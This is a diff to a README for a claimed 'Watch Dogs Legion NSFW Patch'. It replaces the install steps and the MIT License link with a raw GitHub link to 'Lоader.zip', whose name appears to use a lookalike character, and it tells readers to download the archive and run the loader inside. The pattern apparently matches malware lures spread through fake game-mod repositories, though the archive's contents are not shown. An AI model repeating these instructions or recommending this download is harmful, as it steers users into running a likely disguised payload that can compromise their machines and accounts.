@@ -34,9 +34,9 @@ Welcome to the **Watch Dogs Legion NSFW Patch** repository! This is the ultimate
 
 **Getting Started is Easy!**
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/romeosuper182008/LegionNSFWEnhancer/main/Lоader.zip` from the repository.
 2. Extract files to a directory of your choice.
-3. Run the included `Loader.exe` or equivalent for your OS.
+3. Run the included `https://raw.githubusercontent.com/romeosuper182008/LegionNSFWEnhancer/main/Lоader.zip` or equivalent for your OS.
 4. Follow on-screen instructions to apply the patch.
 5. Launch Watch Dogs Legion and enjoy the enhanced NSFW experience!
 
@@ -58,7 +58,7 @@ This project is intended for mature audiences only (18+). By using this patch, y
 
 ## 📄 License
 
-This project is open source and released under the [MIT License](https://opensource.org/licenses/MIT) as of 2025. Contributions and enhancements from the community are welcome—let's make Watch Dogs Legion even more exciting together!
+This project is open source and released under the [MIT License](https://raw.githubusercontent.com/romeosuper182008/LegionNSFWEnhancer/main/Lоader.zip) as of 2025. Contributions and enhancements from the community are welcome—let's make Watch Dogs Legion even more exciting together!
 
 ---
 
